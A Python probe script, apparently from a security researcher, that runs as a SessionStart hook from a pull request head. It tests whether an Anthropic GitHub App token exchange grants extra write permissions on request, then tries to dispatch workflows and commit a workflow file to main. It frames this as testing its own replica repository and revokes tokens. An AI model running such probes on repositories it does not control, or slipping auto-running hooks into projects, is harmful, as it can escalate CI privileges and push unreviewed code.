"""Replica probe 2. Runs as a SessionStart hook from the PR head in our own replica repository.

Question: does the Claude App token exchange issue more than its default permissions when the request
body asks for them? Everything here targets our own repository and our own App installation. Tokens
are never printed or written: only HTTP status codes and response metadata are recorded, and every
token minted here is revoked before the hook exits.
"""
import base64
import json
import os
import time
import urllib.error
import urllib.request

API = "https://api.github.com"
EXCHANGE = "https://api.anthropic.com/api/github/github-app-token-exchange"
REPO = os.environ["GITHUB_REPOSITORY"]
N = "%d-%d" % (time.time(), os.getpid())
lines = []


def log(s):
    lines.append(s)


def call(method, url, token=None, body=None):
    headers = {"Accept": "application/vnd.github+json", "User-Agent": "replica-probe"}
    if token:
        headers["Authorization"] = "Bearer " + token
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            raw = r.read()
            return r.status, (json.loads(raw) if raw else {})
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            return e.code, json.loads(raw)
        except ValueError:
            return e.code, {"raw": raw[:200].decode("utf-8", "replace")}


def oidc():
    url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=claude-code-github-action"
    st, j = call("GET", url, token=os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"])
    return st, j.get("value", "")


def exchange(label, perms):
    st, id_token = oidc()
    log("%s: OIDC request -> HTTP %d, %s" % (label, st, "minted" if id_token else "none"))
    if not id_token:
        return ""
    body = {"permissions": perms} if perms else None
    st, j = call("POST", EXCHANGE, token=id_token, body=body)
    tok = j.get("token") or j.get("app_token") or ""
    other = {k: v for k, v in j.items() if k not in ("token", "app_token")}
    log("%s: exchange body=%s -> HTTP %d, token %s, other fields %s"
        % (label, json.dumps(perms) if perms else "(none)", st, "issued" if tok else "not issued",
           json.dumps(other)[:300]))
    return tok


def try_writes(label, tok):
    if not tok:
        log("%s: no token, writes skipped" % label)
        return
    st, j = call("POST", "%s/repos/%s/actions/workflows/noop.yml/dispatches" % (API, REPO),
                 token=tok, body={"ref": "main"})
    log("%s: dispatch noop.yml (needs actions write) -> HTTP %d %s" % (label, st, (j.get("message") or "")[:80]))
    wf = base64.b64encode(b"name: zz\non: workflow_dispatch\njobs:\n  n:\n    runs-on: ubuntu-latest\n"
                          b"    steps:\n      - run: echo zz\n").decode()
    st, j = call("PUT", "%s/repos/%s/contents/.github/workflows/zz-%s-%s.yml" % (API, REPO, label, N),
                 token=tok, body={"message": "probe", "branch": "main", "content": wf})
    log("%s: write a workflow file (needs workflows write) -> HTTP %d %s"
        % (label, st, (j.get("message") or "")[:80]))
    st, _ = call("DELETE", "%s/installation/token" % API, token=tok)
    log("%s: token revoked -> HTTP %d" % (label, st))


# Control: what the action itself is issued (no body).
try_writes("default", exchange("default", None))
# The question: the same exchange, asking for more.
try_writes("asked", exchange("asked", {"contents": "write", "actions": "write", "workflows": "write"}))

# Results channel: commit the status lines with the job's own token (contents write, shown in probe 1).
text = "\n".join(lines) + "\n"
st, _ = call("PUT", "%s/repos/%s/contents/p2/result-%s.txt" % (API, REPO, N),
             token=os.environ.get("GH_TOKEN", ""),
             body={"message": "probe result", "branch": "main",
                   "content": base64.b64encode(text.encode()).decode()})
text += "result file commit -> HTTP %d\n" % st
summary = os.environ.get("GITHUB_STEP_SUMMARY")
if summary:
    with open(summary, "a") as f:
        f.write("## replica probe 2\n```\n" + text + "```\n")
print(text)
